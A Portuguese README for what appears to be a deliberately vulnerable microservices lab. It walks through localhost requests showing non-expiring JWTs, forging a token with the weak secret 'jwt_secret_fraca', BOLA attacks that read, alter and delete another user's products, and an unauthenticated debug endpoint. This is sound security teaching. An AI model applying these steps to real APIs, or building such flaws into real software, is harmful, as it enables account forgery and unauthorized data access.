
## 🧪 Para funcionar a aplicação é necessário os seguintes passos:

- Os três serviços estão rodando (gateway na porta 3000, auth-service na 3001, product-service na 3002).
- Bancos `auth_db` e `product_db` criados no MySQL (create database auth_db; create database product_db;)
- Thunder Client aberto (ou outro cliente REST, como Postman ou Insomnia).

---

## 🔧 Parte 0 – Preparação (executar uma vez)

Crie dois usuários: **Alice** e **Bob**.

### Passo 0.1 – Registrar Alice

- **Método:** `POST`
- **URL:** `http://localhost:3000/api/auth/register`
- **Body (JSON):**
  ```json
  {
    "username": "alice",
    "password": "123456"
  }
  ```
- **Resposta esperada:** `{ "id": 1, "username": "alice" }`

### Passo 0.2 – Registrar Bob

- **Método:** `POST`
- **URL:** `http://localhost:3000/api/auth/register`
- **Body:**
  ```json
  {
    "username": "bob",
    "password": "123456"
  }
  ```
- **Resposta esperada:** `{ "id": 2, "username": "bob" }`

### Passo 0.3 – Login de Alice (obter token)

- **Método:** `POST`
- **URL:** `http://localhost:3000/api/auth/login`
- **Body:**
  ```json
  {
    "username": "alice",
    "password": "123456"
  }
  ```
- **Resposta:** `{ "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." }`  
  **Copie este token** – vamos chamá-lo de `TOKEN_ALICE`.

### Passo 0.4 – Login de Bob (obter token)

- **Método:** `POST`
- **URL:** `http://localhost:3000/api/auth/login`
- **Body:**
  ```json
  {
    "username": "bob",
    "password": "123456"
  }
  ```
- **Resposta:** outro token – `TOKEN_BOB`.

---

## 🔓 Parte 1 – Broken Authentication (auth-service)

Aqui vamos provar que o token **nunca expira** e que o **segredo é fraco**.

### 1.1 Token não expira (mesmo após esperar)

1. Anote o horário atual.
2. Aguarde **2 minutos** (ou mais).
3. Use o `TOKEN_ALICE` em uma requisição a um endpoint que exige autenticação, por exemplo:
   - **Método:** `GET`
   - **URL:** `http://localhost:3000/api/products`
   - **Header:** `Authorization: Bearer TOKEN_ALICE`
4. **Resultado esperado:** a requisição funciona (status 200).  
   ✅ **Vulnerabilidade confirmada** – o token nunca expira, pois foi gerado sem a opção `expiresIn`.

### 1.2 Forjar um token válido com segredo fraco

Sabemos que o segredo usado é `jwt_secret_fraca` (ou o valor do `.env`).  
Um atacante pode gerar um token falso para qualquer usuário.

1. Acesse o site [jwt.io](https://jwt.io).
2. No campo **Payload**, cole:
   ```json
   {
     "id": 1,
     "username": "alice"
   }
   ```
3. No campo **Secret** (na parte direita, em “verify signature”), digite: `jwt_secret_fraca`
4. Copie o token gerado (será algo como `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...`).
5. Use esse token **falso** no Thunder Client para acessar `GET http://localhost:3000/api/products` com o header `Authorization: Bearer token_falso`.
6. **Resultado esperado:** a requisição retorna produtos (status 200).  
   ✅ **Vulnerabilidade confirmada** – o serviço aceita qualquer token assinado com o segredo fraco, mesmo que não tenha sido emitido pelo auth-service.

---

## 🎯 Parte 2 – BOLA (Broken Object Level Authorization) no product-service

Agora vamos mostrar que **Alice pode criar produto com o ID do Bob** e que **Bob pode listar, alterar e deletar produtos de Alice**.

### 2.1 Alice cria um produto que “pertence” ao Bob

- **Método:** `POST`
- **URL:** `http://localhost:3000/api/products`
- **Header:** `Authorization: Bearer TOKEN_ALICE`
- **Body:**
  ```json
  {
    "name": "Notebook Gamer",
    "price": 4500.00,
    "userId": 2
  }
  ```
  *(Atenção: `userId: 2` é o ID do Bob – veja no seu banco qual é o ID real dele)*

- **Resposta esperada:** Produto criado com sucesso (status 201).  
  ✅ **BOLA confirmada** – Alice conseguiu criar um produto associado a outro usuário.

### 2.2 Bob lista **todos** os produtos (incluindo o de Alice)

- **Método:** `GET`
- **URL:** `http://localhost:3000/api/products`
- **Header:** `Authorization: Bearer TOKEN_BOB`

- **Resposta esperada:** A lista contém produtos que não foram criados por Bob.  
  ✅ **BOLA confirmada** – Bob acessa objetos que não lhe pertencem.

### 2.3 Bob altera o produto de Alice

1. Pegue o `id` do produto que Alice criou (deve ser `1` se for o primeiro produto).
2. **Método:** `PUT`
3. **URL:** `http://localhost:3000/api/products/1`
4. **Header:** `Authorization: Bearer TOKEN_BOB`
5. **Body:**
   ```json
   {
     "name": "Produto alterado por Bob",
     "price": 1.00
   }
   ```
6. **Resposta esperada:** `{ "message": "Produto atualizado" }` (status 200).  
   ✅ **BOLA confirmada** – Bob modificou um produto que não é dele.

### 2.4 Bob deleta o produto de Alice

- **Método:** `DELETE`
- **URL:** `http://localhost:3000/api/products/1`
- **Header:** `Authorization: Bearer TOKEN_BOB`

- **Resposta esperada:** status 204 (No Content).  
  ✅ **BOLA confirmada** – Bob excluiu o produto de Alice.

---

## 🕳️ Parte 3 – Improper Inventory Management

Agora vamos acessar um **endpoint interno, não documentado e sem autenticação** no product-service.

### Passo 3.1 Acessar diretamente o endpoint ` /internal/debug`

**Atenção:** Este endpoint está no **product-service** (porta 3002), não passa pelo gateway.

- **Método:** `GET`
- **URL:** `http://localhost:3002/products/internal/debug`
- **Nenhum header de autenticação** (não envie token).

- **Resposta esperada:** Um JSON com informações sensíveis:
  ```json
  {
    "message": "DEBUG ENDPOINT - Não usar em produção",
    "total_products": 5,
    "products_sample": [ ... ],
    "server_time": "2025-04-15T..."
  }
  ```
  ✅ **Improper Inventory Management confirmada** – endpoint sombra, exposto, sem documentação e sem qualquer controle de acesso.

---

## 📝 Resumo do que você acabou de testar

| Passo | Vulnerabilidade | Evidência |
|-------|----------------|------------|
| 1.1   | Broken Authentication | Token JWT continua válido após horas/dias |
| 1.2   | Broken Authentication | Token forjado com segredo fraco é aceito |
| 2.1   | BOLA | Alice cria produto com `userId` de Bob |
| 2.2   | BOLA | Bob vê produtos de Alice |
| 2.3   | BOLA | Bob altera produto de Alice |
| 2.4   | BOLA | Bob deleta produto de Alice |
| 3.1   | Improper Inventory Management | Endpoint `/internal/debug` acessível publicamente |
